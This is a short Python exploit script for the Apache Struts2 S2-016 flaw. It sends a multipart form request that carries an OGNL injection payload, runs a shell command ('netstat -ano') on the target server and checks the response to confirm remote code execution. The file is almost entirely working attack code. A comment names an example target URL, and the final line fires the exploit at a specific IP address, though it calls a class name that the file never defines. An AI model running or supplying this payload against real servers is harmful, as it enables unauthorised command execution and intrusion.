import requests
# url随意
# eg：http://218.3.16.55:9070/res/jsp/res/androidQuery.do

class struts2_016_multipart_formdata__special:
    def __init__(self,url):
        self.url = url

    def attack(self):
        print('test {} --> struts2_016_multipart_formdata__special'.format(self.url))
        headers = {
            "Accept-Encoding": "gzip, deflate",
            "Connection": " Keep-Alive",
            "Cookie": "",
            "Content-Type": "multipart/form-data; boundary=------------------------4a606c052a893987",
        }
        exp = '''--------------------------4a606c052a893987\r\nContent-Disposition: form-data; name="method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#res=@org.apache.struts2.ServletActionContext@getResponse(),#res.setCharacterEncoding(#parameters.encoding[0]),#w=#res.getWriter(),#s=new java.util.Scanner(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream()).useDelimiter(#parameters.pp[0]),#str=#s.hasNext()?#s.next():#parameters.ppp[0],#w.print(#str),#w.close(),1?#xx:#request.toString&cmd=netstat -ano&pp=\\A&ppp= &encoding=UTF-8"\r\n\r\n-1\r\n--------------------------4a606c052a893987--'''
        try:
            resp = requests.post(self.url, data=exp, headers=headers, timeout=10)
            if "0.0.0.0" in resp.text:
                return "s2-016"
        except:
            #print('test --> struts2_016_multipart_formdata__special Failed!')
            return None
        return None

print(struts2_016('http://45.77.123.178/').attack())